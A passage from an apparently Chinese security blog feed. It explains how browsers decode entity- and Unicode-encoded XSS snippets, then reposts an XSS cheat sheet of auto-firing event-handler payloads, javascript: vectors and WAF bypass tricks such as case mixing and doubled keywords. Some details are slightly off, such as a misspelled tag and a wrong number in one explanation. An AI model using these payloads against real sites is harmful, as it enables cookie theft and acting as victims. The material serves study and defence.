State）就会对实体进行解码为&lt;，后面 的&gt;同样道理被解码为&gt;。因为解析器在使用字符引用后不会转换到标签打开状态（Tag OpenState），不进入标签打开状态就不会被发布为 HTML 标签。因此，不会创建新 HTML 标签， 只会将其作为数据来处理。 这也是为什么我们可以使用字符实体来避免用户不安全输入导致 XSS 的原因。</div></p></li></ul></blockquote><p><code>0x05</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗，但是能够被解码。因为 <code>textarea</code> 和 <code>title</code> 标签名称是 <code>RCDATA</code>  元素<sup>[0x07]</sup>，但是处于 <code>RCDATA State</code> 状态时，<font color="brown"><strong>字符实体是会被解析器解码的。</strong></font>所以上述的语句会被解码成下述语句 <code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code> ，但是里面的 JS 同样还是不会被执行，原因还是因为解码字符实体状态机不会进入<code>标签打开状态（TagOpen State）</code>，因此里面的 <code>&lt;script&gt;</code> 并不会被解析为 HTML 标签。</p><p><img src="/images/95-4.png" alt></p></blockquote><p><code>0x06</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。和 <code>0x05</code> 的解释差不多，在 <code>RCDATA</code>元素内，字符实体状态机不会进入<code>标签打开状态（TagOpen State）</code>，因此里面的 <code>&lt;script&gt;</code> 并不会被解析为 HTML 标签。所以不会弹窗。</p><p><img src="/images/95-5.png" alt></p></blockquote><p><code>0x07</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span></span></span><br></pre></td></tr></table></figure><blockquote><p>因为 <code>confirm</code> <code>alert</code> <code>prompt</code> 函数的功能都有弹出窗口的作用，<code>&amp;#39</code> 在 HTML 解析阶段被编码为<code>'</code>，所以能成功执行。</p></blockquote><p><code>0x08</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这道题和上一道题相似，但只不过是实体编码换成了 unicode 编码，因为 js 解码 Unicode 之后得到的结果知识字符，而 <code>'</code> 又是一个控制字符，但是不会被当作控制字符，所以不会被成功执行。</p></blockquote><p><code>0x09</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。因为在<code>原始文本元素</code>（<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>）类型标签下的所有字符实体编码都不会被 HTML 解码。因此上述语句不会被解码。</p></blockquote><p><code>0x0A-</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#57;&amp;#41;&amp;#59;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能弹窗。<sup>[0x08] &amp; [0x09]</sup></p><p><img src="/images/95-6.jpg" alt></p><ul><li><p><font color="red"><strong>分析一</strong></font>：因为 <code>&lt;svg&gt;</code> 属于 <code>XML</code> 元素，不是 <code>HTML</code> 标签，因为下 xml 支持在标签内解析HTML实体字符，所以实体编码在 XML 中会被解析，并被执行。在 XML 中实体会自动转义，除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体。</p></li><li><p><font color="red"><strong>分析二</strong></font>：待续</p></li></ul></blockquote><p><code>0x0A</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能弹窗。因为<font color="red"><strong>Unicode 序列不能出现在控制字符中，否则不能被解释。</strong></font>而 <code>\u0061\u006c\u0065\u0072\u0074</code> 中没有控制符，将 <code>Unicode</code> 解码后成为 <code>alert</code> ，它只是标识符</p></blockquote><p><code>0x0B</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不会弹窗。<code>javascript</code>解码器会将 <code>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</code> 解码为 <code>alert(1)</code>，该结果中的控制字符<code>(</code> 和 <code>)</code> 被编码了，所以不能被正常解释。</p></blockquote><p><code>0x0C</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。被编码部分为 alert 及括号内为12。原因在于括号内被编码的部分不能被正常解释，即使反编码之后为数字，但是仍然按照<code>字符串</code>来处理（<font color="navy"><strong>这里的12为字符串12，并不是int整数</strong></font>）。要么使用 ASCII 数字，要么加” &quot;或’ '使其变为字符串，作为字符串也只能作为普通字符。</p></blockquote><p><code>0x0D</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能被执行。<code>\u0027</code> 被编码为 <code>'</code> ，该符号属于控制字符，所以这里控制字符被编码了，解码后的 <code>'</code> 将<strong>变为字符串的一部分，而不再解释为控制字符</strong>。因此该例中字符串是不完整的，因为没有 <code>'</code> 来结束字符串。</p></blockquote><p><code>0x0E</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'14\u000a'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能被成功执行。和 <code>0x0D</code> 进行对比可知，这里有 <code>'</code> 符号作为控制字符来结束字符串，所以能够被执行。</p></blockquote><p><code>0x0F</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能被执行。分析过程如下：</p><p><code>步骤 ①</code> ：首先是HTML 解析，将 <code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;</code>  解码为 <code>javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code></p><p><code>步骤 ②</code> ：因为 <code>href</code> 属性，因为存在着 <code>javascript:</code> 伪协议，所以紧接着进行 <code>URL 解析</code>，将 <code>javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</code> 解析为 <code>javascript:\u0061\u006c\u0065\u0072\u0074(15)</code></p><p><code>步骤 ③</code>：最后通过 <code>javascript 解析器</code> 将 <code>javascript:\u0061\u006c\u0065\u0072\u0074(15)</code>  解码为 <code>javascript:alert(15)</code> ，所以最终得到的结果是 <code>&lt;a href=javascript:alert(15)&gt;&lt;/a&gt;</code>，在<code>Unicode</code> 解码过程中，并没有控制字符被编码，所以 <code>javascript:alert(15)</code> 能成功地被执行。</p></blockquote><h3 id="font-color-navy四-参考文献font"><a class="markdownIt-Anchor" href="#font-color-navy四-参考文献font"></a> <font color="navy">四、参考文献</font></h3><p><strong>0x01</strong> 深入理解浏览器解析机制和XSS向量编码：<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a></p><p><strong>0x02</strong> 浏览器渲染原理与编码解码：<a href="https://lalajun.github.io/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/#unicode%E7%BC%96%E7%A0%81-javascript%E8%A7%A3%E6%9E%90%E5%99%A8" target="_blank" rel="noopener">https://lalajun.github.io/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/#unicode%E7%BC%96%E7%A0%81-javascript%E8%A7%A3%E6%9E%90%E5%99%A8</a></p><p><strong>0x03</strong> 浏览器编码题目：<a href="http://test.attacker-domain.com/browserparsing/answers.txt" target="_blank" rel="noopener">http://test.attacker-domain.com/browserparsing/answers.txt</a></p><p><strong>0x04</strong> 一次对浏览器解析和XSS的深度探究：<a href="https://www.freebuf.com/articles/web/222849.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/222849.html</a></p><p><strong>0x05</strong> 深入探究浏览器编码及XSS Bypass：<a href="https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA</a></p><p><strong>0x06</strong> XSS与字符编码及浏览器解析原理：<a href="http://www.lin2zhen.top/index.php/archives/16/" target="_blank" rel="noopener">http://www.lin2zhen.top/index.php/archives/16/</a></p><p><strong>0x07</strong> HTML5/syntax：<a href="https://www.w3.org/html/ig/zh/wiki/HTML5/syntax" target="_blank" rel="noopener">https://www.w3.org/html/ig/zh/wiki/HTML5/syntax</a></p><p><strong>0x08</strong> SVG XSS的一个黑魔法：<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p><p><strong>0x09</strong> 图片XSS小结：<a href="https://www.mi1k7ea.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy一-判断下列语句能否成功执行font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy一-判断下列语句能否成功执行font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;一、
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【转载】 XSS 简单总结</title>
    <link href="https://muzibing.github.io/2020/02/23/2020.02.23%EF%BC%8894%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/23/2020.02.23（94）/</id>
    <published>2020-02-22T16:00:00.000Z</published>
    <updated>2020-03-09T08:31:23.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简述"><a class="markdownIt-Anchor" href="#简述"></a> 简述</h1><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h1 id="常用的xss攻击手段和目的"><a class="markdownIt-Anchor" href="#常用的xss攻击手段和目的"></a> 常用的XSS攻击手段和目的</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.盗用cookie，获取敏感信息。</span><br><span class="line">2.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</span><br><span class="line">3.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。</span><br><span class="line">4.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</span><br><span class="line">5.在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。</span><br></pre></td></tr></table></figure><h1 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h1><h2 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</span><br><span class="line">反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</span><br></pre></td></tr></table></figure><h2 id="存储型"><a class="markdownIt-Anchor" href="#存储型"></a> 存储型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</span><br><span class="line">此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</span><br></pre></td></tr></table></figure><h2 id="dom型"><a class="markdownIt-Anchor" href="#dom型"></a> DOM型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</span><br></pre></td></tr></table></figure><h1 id="无任何过滤情况下"><a class="markdownIt-Anchor" href="#无任何过滤情况下"></a> 无任何过滤情况下</h1><h2 id="一些常见标签"><a class="markdownIt-Anchor" href="#一些常见标签"></a> 一些常见标签</h2><p><strong>PS：下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发，还有我测试的浏览器是火狐，Chrome，IE11.0，其它的浏览器没有去测试，有兴趣的师傅可以测试一下 =。=</strong></p><p><code>script</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>img</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>input</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line">&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>details</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line">&lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>svg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>select</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>iframe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>video</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>audio</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>body</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>textarea</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>keygen</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure><p><code>marquee</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure><p><code>isindex</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</span><br></pre></td></tr></table></figure><h3 id="利用link远程包含js文件"><a class="markdownIt-Anchor" href="#利用link远程包含js文件"></a> 利用link远程包含js文件</h3><p><strong>PS：在无CSP的情况下才可以</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="javascript伪协议"><a class="markdownIt-Anchor" href="#javascript伪协议"></a> javascript伪协议</h3><p><code>&lt;a&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;//IE7以下</span><br></pre></td></tr></table></figure><p><code>&lt;form&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure><h3 id="其它"><a class="markdownIt-Anchor" href="#其它"></a> 其它</h3><p>expression属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=&quot;xss:expression(alert(&apos;xss&apos;&apos;))&quot;&gt; // IE7以下</span><br><span class="line">&lt;div style=&quot;color:rgb(&apos;&apos;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下</span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</span><br></pre></td></tr></table></figure><p>background属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure><h1 id="有过滤的情况下"><a class="markdownIt-Anchor" href="#有过滤的情况下"></a> 有过滤的情况下</h1><h2 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h2><p>用<code>/</code>代替空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤关键字"><a class="markdownIt-Anchor" href="#过滤关键字"></a> 过滤关键字</h2><h3 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过"></a> 大小写绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h3 id="双写关键字"><a class="markdownIt-Anchor" href="#双写关键字"></a> 双写关键字</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h3 id="字符拼接"><a class="markdownIt-Anchor" href="#字符拼接"></a> 字符拼接</h3><p>利用eval</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 